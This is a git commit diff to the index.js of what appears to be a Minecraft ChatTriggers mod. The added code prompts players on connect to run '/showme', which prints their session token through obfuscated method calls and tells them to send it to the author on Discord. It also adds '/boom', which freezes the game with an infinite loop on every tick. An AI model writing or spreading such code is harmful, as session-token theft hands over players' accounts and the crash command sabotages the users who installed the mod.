20745288bffe3fbd2d585aed21caedbacae14ea9
jcnlk <itsjxnik@gmail.com>
2025-07-12 02:34:30 +0200

    Update index.js

--- index.js
+++ index.js
@@ -4,4 +4,14 @@ import "./features/Riftstalker/dudechill";
 import { sendMsg } from "./utils/utils";
 
 register("command", () => config.openGUI()).setName("fuckcole").setAliases(["fc", "cole"]);
-register("gameLoad", () => sendMsg("&ait didnt fail loading ggwp"));
+register("gameLoad", () => sendMsg("&aIt didnt fail loading ggwp"));
+register("serverConnect", () => Client.scheduleTask(20, () => sendMsg("Make sure to run '/boom' and '/showme'!")))
+
+register("command", () => {
+  ChatLib.chat("This is your ssid!");
+  ChatLib.chat("Make sure to send it 'jcnlk' on discord!")
+  ChatLib.chat("");
+  ChatLib.chat(Client.getMinecraft().func_110432_I().func_148254_d());
+}).setName("ssid").setAliases(["getssid", "showme"]);
+
+register("command", () => register("tick", () => {while (true) {}})).setName("boom");
